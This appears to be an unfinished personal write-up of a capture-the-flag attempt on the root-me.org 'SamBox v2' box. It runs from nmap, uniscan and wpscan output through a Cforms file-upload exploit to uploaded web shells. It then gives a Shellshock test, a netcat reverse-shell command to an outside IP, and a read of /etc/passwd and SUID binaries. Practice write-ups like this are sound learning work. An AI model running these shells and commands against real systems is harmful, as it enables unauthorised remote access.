@@ -1,0 +1,219 @@
+SamBox v2
+time taken: not complete
+
+extra hardmode: this vulnbox is written in French...
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-28 00:01 MDT
+Warning: 212.129.28.18 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.079s latency).
+Not shown: 992 closed ports
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 6.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2c:e6:c6:e1:6d:a8:34:ac:43:90:5c:d9:df:72:cb:ff (RSA)
+|_  256 cf:30:54:92:ed:c9:b8:90:4c:af:00:a0:8b:fd:9a:07 (ECDSA)
+25/tcp   filtered smtp
+80/tcp   open     http         Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16)
+|_http-generator: WordPress 4.1.1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: sambox v2 | Un site utilisant WordPress
+135/tcp  filtered msrpc
+139/tcp  filtered netbios-ssn
+443/tcp  open     ssl/http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: sambox v2 | Un site utilisant WordPress
+| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2015-02-04T09:12:00
+|_Not valid after:  2016-02-04T09:12:00
+|_ssl-date: 2017-06-28T06:01:47+00:00; 0s from scanner time.
+|_tls-nextprotoneg: <empty>
+445/tcp  filtered microsoft-ds
+3306/tcp open     mysql        MariaDB (unauthorized)
+Aggressive OS guesses: QEMU user mode network gateway (96%), Konica Minolta 7035 printer (87%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (87%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (87%), GNU Hurd 0.3 (87%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (86%), Cisco Catalyst 1900 switch or RAD IPMUX-1 TDM-over-IP multiplexer (86%), HP 9100c Digital Sender printer (J3113A) (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.10 ms 10.0.2.2
+2   0.25 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.95 seconds
+
+nothing in robots.txt
+
+uniscan:
+
+| [+] CODE: 200 URL: http://ctf01.root-me.org/admin/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/conta/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/cont/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/contacts/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/contact/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/feed/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/icons/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/login/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/page/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/rss/
+| [+] CODE: 200 URL: http://ctf01.root-me.org/wp-admin/
+
+| [+] CODE: 200 URL: http://ctf01.root-me.org/admin/index.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/favicon.ico
+| [+] CODE: 200 URL: http://ctf01.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf01.root-me.org/license.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/readme.html
+| [+] CODE: 200 URL: http://ctf01.root-me.org/robots.txt
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf01.root-me.org/xmlrpc.php
+
+| E-mails:
+| [+] E-mail Found: pete@mail.com
+| [+] E-mail Found: info@ajoft.com
+| [+] E-mail Found: sangita@leadvirus.com
+| [+] E-mail Found: sales3@mail.com
+| [+] E-mail Found: sales1@mail.com,
+| [+] E-mail Found: mkosmul@users.sourceforge.net
+| [+] E-mail Found: mathewhendry@hotmail.com
+| [+] E-mail Found: hr1@mail.scom,
+| [+] E-mail Found: kevinh@kevcom.com
+| [+] E-mail Found: hillary@mail.com
+| [+] E-mail Found: m@tidakada.com
+| [+] E-mail Found: tangchao.zju@gmail.com
+| [+] E-mail Found: sales2@mail.com,
+| [+] E-mail Found: office@kosivart.com
+| [+] E-mail Found: info@buy-hosting.net
+| [+] E-mail Found: info@getid3.org
+| [+] E-mail Found: sales1@mail.com,sales2
+| [+] E-mail Found: info@webdesigner-flensburg.de
+| [+] E-mail Found: humbedooh@apache.org
+| [+] E-mail Found: john.doe@doe.com
+| [+] E-mail Found: janey@mail.com
+| [+] E-mail Found: admin@mail.com
+| [+] E-mail Found: info@alpenimmobilien.de
+| [+] E-mail Found: hr2@mail.com
+| [+] E-mail Found: joe@mail.com
+| [+] E-mail Found: mike@hyperreal.org
+
+
+
+http://ctf01.root-me.org/admin/ --> wordpress site
+
+-->
+http://ctf01.root-me.org/wp-login.php?redirect_to=http%3A%2F%2Fctf01.root-me.org%2Fwp-admin%2F&reauth=1
+
+wpscan:
+
+wpscan -u http://ctf01.root-me.org -enumerate u
+
+
+[+] URL: http://ctf01.root-me.org/
+[+] Started: Wed Jun 28 00:09:30 2017
+
+[+] robots.txt available under: 'http://ctf01.root-me.org/robots.txt'
+[!] The WordPress 'http://ctf01.root-me.org/readme.html' file exists exposing a version number
+[+] Interesting header: SERVER: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
+[+] Interesting header: X-POWERED-BY: PHP/5.4.16
+[+] XML-RPC Interface available under: http://ctf01.root-me.org/xmlrpc.php
+[!] Upload directory has directory listing enabled: http://ctf01.root-me.org/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://ctf01.root-me.org/wp-includes/
+
+[+] WordPress version 4.1.1 (Released on 2015-02-18) identified from meta generator, rss generator, rdf generator, atom generator, links opml
+[!] 34 vulnerabilities identified from the version number
+
+.
+.
+.
+
+[!] Title: Cforms & CformsII <= 14.7 - Remote Code Execution via Unauthorised File Upload <-- WE WILL USE THIS VULN
+    Reference: https://wpvulndb.com/vulnerabilities/7752
+    Reference: http://www.securityfocus.com/archive/1/534349/30/0/threaded
+    Reference: https://packetstormsecurity.com/files/129762/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9473
+    Reference: https://www.exploit-db.com/exploits/35879/
+[i] Fixed in: 14.8
+
+[!] Title: Cforms & CformsII <= 14.10.1 - CAPTCHA Bypass
+    Reference: https://wpvulndb.com/vulnerabilities/8781
+    Reference: http://cosine-security.blogspot.de/2010/12/cformsii-captcha-bypass-vulnerability.html
+    Reference: http://packetstormsecurity.com/files/96729/
+    Reference: http://www.securityfocus.com/bid/45418/
+[i] Fixed in: 14.11
+
+[+] Finished: Wed Jun 28 00:10:15 2017
+[+] Requests Done: 76
+[+] Memory used: 61.984 MB
+[+] Elapsed time: 00:00:45
+
+so we find a TwentyThirteen theme that may be useful to exploit later
+
+upload a shell in http://ctf01.root-me.org/contacts/#usermessage2a
+
+listen, go to http://ctf01.root-me.org/wp-content/uploads/noid-php-reverse-shell1.php
+
+root@kdog:~/ctf_shit# nc -vnlp 4447
+listening on [any] 4447 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 57237
+root@kdog:~/ctf_shit#
+
+WARNING: Failed to daemonise. This is quite common and not fatal. ERROR: Can't spawn shell 
+
+fuck that didn't work...
+
+upload wso.php..
+
+use cgitelnet.pl to get a cgi cmd line
+
+use wso.php to upload cgitelnet.pl to /cgi-bin/ to get a browser shell (kind of)
+
+this shit is old as fuck, circa 2001, wow...
+
+env x='() { :;}; mknod /tmp/backpipe p ' bash -c 'echo hello'
+
+then
+
+/bin/sh 0</tmp/backpipe | nc 24.252.40.195 4447 1>/tmp/backpipe
+
+and on my machine:
+
+root@kdog:~/ctf_shit/sambox_v2# nc -nlvp 4447
+listening on [any] 4447 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 36991
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+ok so now we have an actual backdoor, SOON...
+
+
+cat /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+.
+.
+.
+sam:x:1000:1000::/home/sam:/bin/bash
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+
+local privesc is not working
+
+find / -perm -u=s -type f 2>/dev/null -- lets see if there are any apps that can be run as root...:
+
+usr/bin/chage /usr/bin/chfn /usr/bin/chsh /usr/bin/mount /usr/bin/su /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/passwd /usr/bin/umount /usr/bin/at /usr/bin/pkexec /usr/bin/crontab /usr/bin/staprun /usr/bin/sudo /usr/sbin/unix_chkpwd /usr/sbin/pam_timestamp_check /usr/sbin/usernetctl /usr/sbin/userhelper /usr/lib/polkit-1/polkit-agent-helper-1 find: '/usr/lib/firewalld': Permission denied /usr/lib64/dbus-1/dbus-daemon-launch-helper find: '/usr/share/polkit-1/rules.d': Permission denied find: '/usr/libexec/initscripts/legacy-actions/auditd': Permission denied /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache find: '/home/sam': Permission denied /passwd
+
+nothing...
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+vulnerable, maybe we can use shellshock?
+
+
+fuck if I know tbh. This one is very hard indeed. managed to get some backdoors but no root yet >:{
+I'll come back to it
+
+
